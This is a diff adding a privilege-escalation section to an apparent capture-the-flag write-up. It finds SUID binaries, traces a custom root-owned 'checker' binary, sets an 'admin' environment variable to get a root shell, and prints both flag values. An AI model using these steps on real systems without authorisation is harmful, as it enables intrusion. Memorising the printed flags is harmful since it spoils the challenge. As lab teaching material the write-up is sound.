@@ -309,6 +309,118 @@ Despite successfully locating user.txt in the /home/bjoel directory, we are unab
 To gain access to the file, escalating privileges on the system is required.
 
 
+**Privilege escalation**
+
+First, I used the shell command in meterpreter to have full access to standard linux shell commands.
+
+```
+meterpreter > shell
+Process 1573 created.
+Channel 1 created.
+```
+
+Next search for UID files to find files to use for escalating privileges
+
+``find / -perm -u=s -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd`
+
+```
+
+Off all these, the file /usr/sbin/checker stands out because is not an usual binary and is a root owned binary, with SUID flag on
+
+```
+$ ls -la /usr/sbin/checker     
+-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
+```
+The rws permissions show that the binary has the SUID bit set (s), meaning it will run with the privileges of the file owner (root).
+
+
+```
+ltrace checker
+getenv("admin")                                  = nil
+puts("Not an Admin")                             = 13
+Not an Admin
++++ exited (status 0) +++
+```
+This output shows that the binary first checks the value of the admin environment variable with getenv("admin"). 
+Since this variable is not set (nil), it prints "Not an Admin" and exits.
+
+If the admin environment variable is set to 1, it runs bash as root.
+
+```
+$ export admin=1
+$ ltrace checker
+getenv("admin")                                  = "1"
+setuid(0)                                        = -1
+system("/bin/bash"
+$ checker
+$ id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+The id command confirms that I am now root (uid=0), which means I have successfully escalated privileges.
+
+I can now have access to both flags.
+
+```
+cat /media/usb/user.txt
+c8421899aae571f7af486492b71a8ab7
+cat /root/root.txt
+9a0b2b618bef9bfa7ac28c1353d9f318
+```
+
 
 
 
